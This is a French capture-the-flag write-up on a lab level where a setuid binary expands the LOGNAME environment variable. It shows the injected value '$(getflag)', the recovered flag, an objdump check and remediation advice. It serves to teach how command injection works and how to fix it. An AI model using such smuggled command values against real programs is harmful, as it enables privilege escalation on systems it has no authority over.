# Rapport de Vulnérabilité : Injection de commande via la variable d’environnement `LOGNAME`

## Description

Dans ce niveau, un binaire appartenant à `flag07` affiche le contenu de la variable d’environnement `LOGNAME` sans vérification. En manipulant cette variable pour inclure une **commande shell**, il est possible de forcer le programme à exécuter une commande système, comme `getflag`, et d’obtenir ainsi le flag.

## Comment Exploiter la Faille

### Étape 1 : Observation du comportement du binaire

Exécution simple :

```bash
./level07
```

**Résultat :**

```
level07
```

Cela indique que le programme utilise probablement la variable `LOGNAME`.

### Étape 2 : Modifier la variable d’environnement `LOGNAME`

Définir manuellement la variable :

```bash
export LOGNAME=ouioui
./level07
```

**Résultat :**

```
ouioui
```

Cela confirme que le programme affiche directement la valeur de `LOGNAME`.

### Étape 3 : Injecter une commande dans la variable

On remplace la valeur de `LOGNAME` par une commande shell :

```bash
export LOGNAME='$(getflag)'
./level07
```

**Résultat :**

```
fiumuikeil55xe9cu4dood66h
```

La commande `getflag` a bien été exécutée.

### Étape 4 : Confirmation via reverse engineering

Avec `objdump`, on vérifie que le binaire appelle `getenv`, ce qui confirme qu’il récupère la variable d’environnement `LOGNAME` :

```bash
objdump -d -M intel level07
```

Extrait :

```
call   8048400 <getenv@plt>
```

---

## Comment Résoudre la Faille

Pour corriger cette vulnérabilité :

* **Ne jamais exécuter de chaînes provenant d’une variable d’environnement sans les filtrer**.
* **Utiliser des appels sûrs** : Ne pas passer de variables shell dans des fonctions comme `system()` ou via des backticks.
* **Désactiver les expansions de commandes** : Si une variable est destinée à être affichée, la traiter comme une simple chaîne.

## Conclusion

Ce niveau démontre les risques liés à l’utilisation non sécurisée des variables d’environnement. En permettant à l’utilisateur de manipuler `LOGNAME`, le binaire devient vulnérable à une **injection de commande**, pouvant être exploitée pour obtenir des privilèges ou des informations sensibles.

---